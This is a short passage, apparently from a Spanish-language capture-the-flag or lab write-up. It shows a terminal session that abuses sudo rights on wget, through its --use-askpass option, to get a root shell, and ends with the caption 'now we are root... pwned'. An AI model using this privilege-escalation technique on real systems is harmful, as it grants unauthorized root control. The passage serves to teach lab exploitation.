9de7c43b90a1:~$ sudo wget --use-askpass=$funny 0
Prepended http:// to '0'
/home/matsi # whoami
root
```

¡Ahora somos **root** ***...pwned..!***
